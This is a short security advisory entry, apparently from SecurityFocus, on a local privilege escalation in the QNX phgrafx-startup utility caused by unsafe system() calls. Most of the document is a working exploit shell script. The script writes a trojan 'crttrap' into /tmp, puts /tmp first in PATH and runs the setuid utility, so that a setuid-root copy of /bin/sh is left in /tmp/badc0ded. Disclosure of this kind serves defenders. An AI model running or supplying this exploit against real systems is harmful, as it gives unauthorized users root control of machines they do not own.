source: http://www.securityfocus.com/bid/4916/info


The QNX phgrafx-startup utility is prone to an issue which may make it possible for local attackers to escalate privileges. This issue is due to unsafe use of the system() function to invoke other programs. This vulnerability may be trivially exploited to gain root privileges. 

#!/bin/sh
#
# click test,restore,continue  
# now you should have a setuid root shell waiting in /tmp/badc0ded
#
# www.badc0ded.com
echo "#!/bin/sh" > /tmp/crttrap
echo "cp /bin/sh /tmp/badc0ded" >> /tmp/crttrap
echo "chmod 4777 /tmp/badc0ded" >> /tmp/crttrap
echo "/usr/bin/crttrap \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 " >> /tmp/crttrap
chmod 755 /tmp/crttrap
export PATH="/tmp:$PATH"
/usr/photon/bin/phgrafx-startup
